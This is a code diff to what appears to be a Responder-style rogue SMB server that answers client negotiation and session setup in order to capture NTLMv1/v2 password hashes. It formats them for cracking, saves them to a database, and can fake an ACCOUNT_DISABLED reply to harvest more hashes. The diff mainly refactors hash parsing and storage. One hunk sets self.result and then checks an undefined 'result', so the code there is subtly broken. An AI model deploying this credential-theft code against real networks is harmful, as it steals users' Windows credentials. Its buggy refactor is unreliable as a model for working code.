@@ -111,14 +111,14 @@ def ParseSMBHash(data,client, Challenge):  #Parse SMB NTLMSSP v1/v2
 		Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
 		WriteHash    = '%s::%s:%s:%s:%s' % (Username, Domain, LMHash, SMBHash, codecs.encode(Challenge,'hex').decode('latin-1'))
 
-		SaveToDb({
+		return {
 			'module': 'SMB',
 			'type': 'NTLMv1-SSP',
 			'client': client,
 			'user': Domain+'\\'+Username,
 			'hash': SMBHash,
 			'fullhash': WriteHash,
-		})
+		}
 
 	if NthashLen > 60:
 		SMBHash      = SSPIString[NthashOffset:NthashOffset+NthashLen]
@@ -131,14 +131,14 @@ def ParseSMBHash(data,client, Challenge):  #Parse SMB NTLMSSP v1/v2
 		Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
 		WriteHash    = '%s::%s:%s:%s:%s' % (Username, Domain, codecs.encode(Challenge,'hex').decode('latin-1'), SMBHash[:32], SMBHash[32:])
 
-		SaveToDb({
+		return {
 			'module': 'SMB',
 			'type': 'NTLMv2-SSP',
 			'client': client,
 			'user': Domain+'\\'+Username,
 			'hash': SMBHash,
 			'fullhash': WriteHash,
-		})
+		}
 
 def ParseLMNTHash(data, client, Challenge):  # Parse SMB NTLMv1/v2
 	LMhashLen = struct.unpack('<H',data[51:53])[0]
@@ -192,7 +192,7 @@ def IsNT4ClearTxt(data, client):
 				WriteData(settings.Config.SMBClearLog % client, User+":"+Password, User+":"+Password)
 
 
-class SMB1(BaseRequestHandler):  # SMB1 & SMB2 Server class, NTLMSSP
+class SMB(BaseRequestHandler):  # SMB1 & SMB2 Server class, NTLM SSP (NT LAN Manager Security Support Provider)
 	def handle(self):
 		try:
 			self.ntry = 0
@@ -205,7 +205,6 @@ class SMB1(BaseRequestHandler):  # SMB1 & SMB2 Server class, NTLMSSP
 					break
 
 				if data[0:1] == b"\x81":  #session request 139
-					print("session request 139")
 					Buffer = "\x82\x00\x00\x00"
 					try:
 						self.request.send(Buffer)
@@ -213,10 +212,13 @@ class SMB1(BaseRequestHandler):  # SMB1 & SMB2 Server class, NTLMSSP
 					except:
 						pass
 
-				##Negotiate proto answer SMBv2.
+				## Negotiate proto answer SMBv2.
 				if data[8:10] == b"\x72\x00" and re.search(rb"SMB 2.\?\?\?", data):
 					print("Negotiate proto answer SMBv2")
-					head = SMB2Header(CreditCharge="\x00\x00",Credits="\x01\x00")
+					head = SMB2Header(
+						CreditCharge="\x00\x00",
+						Credits="\x01\x00"
+					)
 					t = SMB2NegoAns()
 					t.calculate()
 					packet1 = str(head)+str(t)
@@ -224,7 +226,7 @@ class SMB1(BaseRequestHandler):  # SMB1 & SMB2 Server class, NTLMSSP
 					self.request.send(NetworkSendBufferPython2or3(buffer1))
 					data = self.request.recv(1024)
 
-				## Nego answer SMBv2.
+				## Negotiate answer SMBv2.1
 				if data[16:18] == b"\x00\x00" and data[4:5] == b"\xfe":
 					print("Nego answer SMBv2")
 					head = SMB2Header(
@@ -262,7 +264,10 @@ class SMB1(BaseRequestHandler):  # SMB1 & SMB2 Server class, NTLMSSP
 				## Session Setup 3 answer SMBv2.
 				if data[16:18] == b'\x01\x00' and data[4:5] == b'\xfe' and (GrabMessageID(data)[0:1] == b'\x02' or GrabMessageID(data)[0:1] == b'\x03'):
 					print("Session Setup 3 answer SMBv2.")
-					ParseSMBHash(data, self.client_address[0], Challenge)
+					self.result = ParseSMBHash(data, self.client_address[0], Challenge)
+
+					if result:
+						SaveToDb(result)
 					ntstatus = "\x00\x00\x00\x00"
 					head = SMB2Header(
 						Cmd="\x01\x00",
@@ -293,7 +298,7 @@ class SMB1(BaseRequestHandler):  # SMB1 & SMB2 Server class, NTLMSSP
 							print(f"Normalized client IP to: {client_ip}")
 
 						print("got share hash (with strict length 32): " + share)
-						UpdateSharePath(self.client_address[0], share)
+						UpdateSharePath(client_ip, share)
 
 				# Negotiate Protocol Response smbv1
 				if data[8:10] == b'\x72\x00' and data[4:5] == b'\xff' and re.search(rb'SMB 2.\?\?\?', data) == None:
@@ -338,8 +343,10 @@ class SMB1(BaseRequestHandler):  # SMB1 & SMB2 Server class, NTLMSSP
 							self.request.send(NetworkSendBufferPython2or3(Buffer))
 
 						else:
-							# Parse NTLMSSP_AUTH packet
-							ParseSMBHash(data,self.client_address[0], Challenge)
+							# Parse NTLM SSP_AUTH packet
+							result = ParseSMBHash(data, self.client_address[0], Challenge)
+							if result:
+								SaveToDb(result)
 
 							if settings.Config.CaptureMultipleCredentials and self.ntry == 0:
 								# Send ACCOUNT_DISABLED to get multiple hashes if there are any
